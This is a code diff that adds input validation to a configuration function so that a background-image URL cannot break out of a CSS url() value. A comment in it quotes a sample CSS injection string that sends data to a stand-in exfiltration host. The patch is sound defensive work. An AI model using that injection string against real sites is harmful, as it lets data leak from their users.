@@ -191,6 +191,19 @@ export async function updateConfig(input: { introDialogue: string; bgImage: stri
   if (bg.length > 400) {
     return { ok: false, error: 'invalid-input', message: 'bgImage max 400 chars' };
   }
+  if (bg.length > 0) {
+    // bgImage is interpolated into `background-image: url("${bg}")` on the
+    // client. Enforce a strict scheme so a hostile admin can't break out of
+    // the url() with `") ; background: url("http://exfil?data=` etc. Allow
+    // http(s), data: image URIs, and same-origin relative paths only.
+    const scheme = /^(https?:\/\/|\/|data:image\/)/i;
+    if (!scheme.test(bg)) {
+      return { ok: false, error: 'invalid-input', message: 'bgImage must be http(s):// URL, absolute path, or data:image/…' };
+    }
+    if (/["'\\<>\s]/.test(bg)) {
+      return { ok: false, error: 'invalid-input', message: 'bgImage must not contain quotes, backslashes, angle brackets, or whitespace' };
+    }
+  }
   const now = Date.now();
   await run(SQL_UPSERT_CONFIG, [dialogue, bg, now]);
   log.info('onboarding.config.update', { bgSet: bg.length > 0 });
